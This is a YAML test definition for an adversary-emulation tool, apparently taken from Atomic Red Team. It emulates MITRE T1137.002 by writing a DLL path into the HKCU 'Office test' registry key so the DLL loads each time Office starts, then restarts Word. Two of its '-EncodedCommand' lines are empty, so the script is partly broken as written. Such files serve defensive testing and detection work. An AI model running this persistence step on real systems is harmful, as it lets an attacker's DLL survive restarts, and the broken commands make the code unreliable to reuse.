- id: 02f9f9da-ce09-5cf8-bf4c-8885f4dd62ad
  name: Soumaia ART Tests - Office Application Startup Test Persistence (HKCU)
  description: 'Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office

    application is started. Key is used for debugging purposes. Not created by default & exist in HKCU & HKLM hives.'
  tactic: persistence
  technique:
    attack_id: T1137.002
    name: 'Office Application Startup: Office Test'
  platforms:
    windows:
      psh:
        command: "powershell -NoProfile -EncodedCommand \nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA\n}\npowershell -NoProfile -EncodedCommand aQBmACAAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAuAFwAbwBmAGYAaQBjAGUAdABlAHMAdABfAHgANgA0AC4AZABsAGwAIgApACAALQBhAG4AZAAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAiAC4AXABvAGYAZgBpAGMAZQB0AGUAcwB0AF8AeAA4ADYALgBkAGwAbAAiACkAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=\nif ($LASTEXITCODE -ne 0) {\n    powershell -NoProfile -EncodedCommand \n}\n$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \".\\officetest_x64.dll\" /f       \n}\nelse{\n  Write-Host \"32-bit Office\"\n  reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \".\\officetest_x86.dll\" /f\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\""
        cleanup: |-
          Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
          Remove-Item "HKCU:\Software\Microsoft\Office test\Special\Perf" -ErrorAction Ignore
        payloads:
        - bin
        - officetest_x64.dll
        - officetest_x86.dll
